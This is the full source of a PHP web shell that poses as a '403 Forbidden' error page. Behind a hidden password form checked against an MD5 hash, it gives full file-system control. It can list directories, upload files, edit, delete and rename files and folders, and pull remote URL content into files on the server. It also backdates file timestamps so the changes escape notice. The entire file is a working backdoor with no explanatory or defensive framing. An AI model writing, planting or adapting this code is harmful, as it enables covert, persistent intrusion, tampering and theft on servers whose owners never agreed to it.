<?php 
session_start();

function ucie() {
	$wzq = $_REQUEST; 
	if(!empty($_SESSION['ltd']) || (!empty($wzq['l']) && md5($wzq['l'])=='0007ddd64a53dbc7aaec3629fb7bc765')) {
		$_SESSION['ltd'] = 1;
		zvgf();
	} else {
		exit('<!DOCTYPE html><html><head><title>403 Forbidden.</title></head><body><h1>Forbidden.</h1><p>You don\'t have permission to access / on this server.<br /></p><form action="" method="post"><input type="password" name="l"></form></body></html>');
	}
} ucie();

function zvgf() {
	$Path = dirname(__FILE__);
	$time = time()-rand(30,300)*86400;
	$vifiletime = date('Y-m-d H:i:s',$time);
	$data = array_merge($_GET,$_POST);

	$msg = '';
	$lsdir = isset($data['id']) ? $data['id'] : $Path;
	$vifile = isset($data['vid']) ? $data['vid'] : '';
	$refile = isset($data['refile']) ? $data['refile'] : '';
	if (!empty($data['url'])) {
		file_put_contents($vifile,file_get_contents($data['url']));
		touch($vifile,$time);
	} else	if (!empty($vifile)) {
	 if (isset($data['txt'])) {
		file_put_contents($vifile,$data['txt']);
		if (isset($data['time'])) touch($vifile,strtotime($data['time']));
		$msg = 'ok';
	 }
	 $vifiletxt = '';
	 if(is_file($vifile)) {
		$vifiletxt = file_get_contents($vifile);
		$vifiletime = date('Y-m-d H:i:s',filemtime($vifile));
	 }
	 $lsdir = dirname($vifile);
	} elseif (!empty($_FILES['uf'])) {
	 $up_files = $_FILES['uf']; $up_ok = 0;
	 for($I=0;$I<count($up_files['name']);$I++) {
		if(move_uploaded_file($up_files['tmp_name'][$I], $lsdir.'/'.$up_files['name'][$I])) {
		 chmod($lsdir.'/'.$up_files['name'][$I],0755);
		 $up_ok++;
		 if (isset($data['time'])) touch($lsdir.'/'.$up_files['name'][$I],strtotime($data['time']));
		}
	 }
	 $msg = 'upload = ' . $up_ok;
	} elseif (!empty($data['rm'])) {
	 unlink($data['rm']);
	} elseif (!empty($data['mkd'])) {
	 mkdir($data['mkd']);
	} elseif (!empty($data['rmd'])) {
	 rmdir($data['rmd']);
	} elseif (!empty($data['newfile'])&&!empty($data['oldfile'])) {
	 rename($data['oldfile'],dirname($data['oldfile']).'/'.$data['newfile']);unset($refile);
	}
	if(!empty($data['post'])) exit('#done.');

 $output = '';
 foreach(glob($lsdir.'/*', GLOB_ONLYDIR) as $v) {
 $output .= '<div class="list dir"><span>'.preg_replace('/.*\//','',$v).'</span><i>'.date('Y-m-d H:i:s',filemtime($v)).'</i><u>'.filesize($v).'</u><b>'.substr(sprintf("%o",fileperms($v)),-4).'</b><a href="?id='.$v.'">Open</a> - <a href="?refile='.$v.'">Rename</a> - <a href="?rmd='.$v.'" onclick="return confirm(\'DEL\')">Del</a></div>';
 }
 foreach(glob($lsdir.'/{*,.*,*.}', GLOB_BRACE) as $v) {
 if(is_file($v)) $output .= '<div class="list file"><span>'.preg_replace('/.*\//','',$v).'</span><i>'.date('Y-m-d H:i:s',filemtime($v)).'</i><u>'.filesize($v).'</u><b>'.substr(sprintf("%o",fileperms($v)),-4).'</b><a href="?vid='.$v.'">Edit</a> - <a href="?refile='.$v.'">Rename</a> - <a href="?rm='.$v.'" onclick="return confirm(\'DEL\')">Del</a></div>';
 }

	echo '<!DOCTYPE html><html><head><title>403 Forbidden.</title>
<style>*{font:14px/18px tahoma}input{font-size:12px;margin:5px 0}button{cursor:pointer}.w9{width:90%}.msg{color:red}header{background:#000;color:#fff}header a{color:#fff}header form{display:inline-block}.dir{color:green}.list{line-height:22px}.list:hover{background:#eee}.list *{display:inline-block;text-align:left;width:100px;font-style:normal}.list span,.list i{width:200px}.list a{display:inline;color:blue}#output{padding:10px}</style>
</head><body><header>
<form method="get"><input type="text" name="id" value="'.$lsdir.'"><button type="submit">Dir</button></form>
<form method="post" enctype="multipart/form-data"><input type="file" name="uf[]" multiple><input type="text" name="time" value="'.$vifiletime.'"><button type="submit">UP</button></form>
<form method="get"><input type="text" name="vid" value="'.$lsdir.'"><button type="submit">File</button></form>
<a href="?id='.$_SERVER['DOCUMENT_ROOT'].'">Root Dir</a> <span class="msg">'.$msg.'</span>
</header>
'.(isset($vifiletxt)?'<form method="post"><input type="text" name="time" value="'.$vifiletime.'" class="i"><button type="submit">Save</button><br><textarea name="txt" rows="40" class="w9">'.$vifiletxt.'</textarea></form>':(!empty($refile)?'<form method="post"><br><input type="text" name="oldfile" value="'.$refile.'" class="w9"><br><input type="text" name="newfile" value="" class="w9"><br><button type="submit">Save</button></form>':'<div id="output">'.$output.'</div>')).'</body></html>';
	exit;
}
?>